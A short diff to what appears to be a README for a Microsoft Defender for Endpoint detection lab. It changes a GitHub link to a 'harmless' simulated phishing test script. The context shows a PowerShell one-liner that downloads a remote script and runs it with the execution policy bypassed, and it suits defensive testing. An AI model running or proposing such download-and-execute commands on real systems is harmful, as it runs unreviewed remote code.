@@ -22,7 +22,7 @@ Run the PowerShell command below on your VM **after onboarding it to MDE**:
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\programdata\phishingFakeSoftwareUpdate.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\phishingFakeSoftwareUpdate.ps1
 ```
 
-https://github.com/TrevinoParker7/Powershell-test-payload-harmless/blob/main/phishingFakeSoftwareUpdate.ps1
+https://github.com/dessiflomer33/Powershell-test-payload-harmless/blob/main/phishingFakeSoftwareUpdate.ps1
 
 ---
 
